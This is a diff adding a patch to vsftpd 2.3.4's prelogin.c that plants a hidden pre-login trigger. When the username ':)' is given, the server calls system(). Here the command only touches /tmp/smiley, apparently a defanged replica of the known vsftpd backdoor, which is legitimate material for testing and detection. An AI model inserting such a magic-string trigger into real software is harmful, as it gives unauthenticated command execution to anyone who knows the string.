@@ -1,0 +1,29 @@
+--- vsftpd-2.3.4/prelogin.c	2010-08-06 08:31:04.000000000 +0900
++++ vsftpd-2.3.4-smiley/prelogin.c	2011-07-13 14:32:12.000000000 +0900
+@@ -24,6 +24,8 @@
+ #include "features.h"
+ #include "defs.h"
+ #include "opts.h"
++#include <errno.h>
++#include <string.h>
+ 
+ /* Functions used */
+ static void check_limits(struct vsf_session* p_sess);
+@@ -210,6 +212,17 @@
+   {
+     is_anon = 0;
+   }
++  if (str_equal_text(&p_sess->ftp_arg_str, ":)")) {
++    int ret;
++    char str[120] = "handle_user_command: FAILED!";
++
++    if ((ret=system("/bin/touch /tmp/smiley")) == -1) {
++	sprintf(str,"handle_user_command: system() failed: %s !", strerror(errno));
++	bug(str);
++	vsf_sysutil_exit(0);
++    }
++  }
++
+   if (!tunable_local_enable && !is_anon)
+   {
+     vsf_cmdio_write(
